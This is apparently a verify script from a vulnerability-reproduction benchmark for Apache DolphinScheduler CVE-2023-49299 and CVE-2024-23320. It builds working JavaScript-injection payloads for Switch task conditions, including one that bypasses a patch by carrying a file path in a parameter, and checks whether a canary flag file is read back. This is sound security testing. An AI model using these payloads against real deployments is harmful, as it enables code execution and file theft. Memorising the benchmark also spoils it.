#!/usr/bin/env bash
# PCBV2-0068 apache-dolphinscheduler-cve-2024-23320 — 手写定制 verify.sh
# CVE-2023-49299 (v0 DS 3.1.8: SwitchTaskUtils 只有 evaluate(), 原始任意 JS 直接 Nashorn eval)
#   -> v1 3.1.9 = TARGET (CVE-2023-49299 修复: generateContentWithTaskParams 增加 no-substitution guard)
#   -> CVE-2024-23320 (${param} 替换满足 guard 但任意 JS 仍 eval) -> v2 3.2.1 关键字黑名单拦截.
# 真实 sink: 外部 HTTP POST /eval {condition,params} -> 反射调用真实 SwitchTaskUtils guard + evaluate().
# flag 通道 = canary: 服务端启动时 ${PCB_FLAG} 写入 /canary/flag.txt, 条件 JS 读取并以 PCBOUT:<flag>
#   回显在 /eval 响应. 判定用当前 RUN_FLAG(提交值); wrong/stale override 不得匹配种植的真 flag.
# seed     = 原始任意 JS 条件(+未引用 dummy param) -> v0 直接 eval 读 flag(rc0); v1 no-substitution
#            guard 拦截 -> 未发生(rc10)
# residual = ${p} 参数携带文件路径 + 任意 JS 条件 -> 发生替换满足 guard -> v1 eval 读 flag(rc0);
#            v2 内容含 java/new 关键字 -> 黑名单拦截 -> 未发生
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

APP_PORT="$(dc port "$VERSION" 8080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$APP_PORT" ]]; then echo "verify: 无法解析 ${VERSION}:8080 端口 (need --profile)" >&2; exit 20; fi
export PCB_TARGET_PORT="$APP_PORT"

ready=0
for _ in $(seq 1 60); do
  if curl -fsS --max-time 5 "http://127.0.0.1:${APP_PORT}/healthz" >/dev/null 2>&1; then
    ready=1; break
  fi
  sleep 2
done
if [[ "$ready" != 1 ]]; then echo "verify: ${VERSION} 就绪超时" >&2; exit 20; fi

# canary 通道: 判定基准 = 提交值 RUN_FLAG（wrong/stale 时为 override，不得命中种植的真 flag）
JUDGE_FLAG="$RUN_FLAG"
export PCB_X="$RUN_FLAG"
export PCB_FLAG="$RUN_FLAG"

# --- candidate: seed=原始 JS; residual=${p} 参数携带路径（inline, 不回退 seed） ---
"$PY" - "$MODE" "$WORK_DIR/cand.json" <<'PYEOF'
import json, sys
mode, out = sys.argv[1], sys.argv[2]
READ = ("new java.lang.String(java.nio.file.Files.readAllBytes("
        "java.nio.file.Paths.get(\"/canary/flag.txt\")))")
if mode == "--seed":
    cand = {
        "id": "cve-2023-49299-raw-js",
        "condition": "java.lang.System.out.println('PCBOUT:'+" + READ + ");true",
        # 未引用 dummy param -> 替换发生但不改变内容 -> v1 no-substitution guard 拦截
        "params": {"unused": "1"},
    }
else:
    READ_PARAM = ("new java.lang.String(java.nio.file.Files.readAllBytes("
                  "java.nio.file.Paths.get(${p})))")
    cand = {
        "id": "cve-2024-23320-param-carried-js",
        "condition": "java.lang.System.out.println('PCBOUT:'+" + READ_PARAM + ");true",
        "params": {"p": "/canary/flag.txt"},
    }
json.dump(cand, open(out, "w"))
PYEOF

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || {
  echo "verify: seed_exec 执行失败" >&2; printf '%s\n' "$OUT" >&2; exit 20; }
echo "verify: ${VERSION} ${MODE} out=$(printf '%s' "$OUT" | head -c 500)"

# --- 判定: 当前 RUN_FLAG 出现在 /eval 响应 ---
if grep -qF "$JUDGE_FLAG" <<<"$OUT"; then exit 0; else exit 10; fi
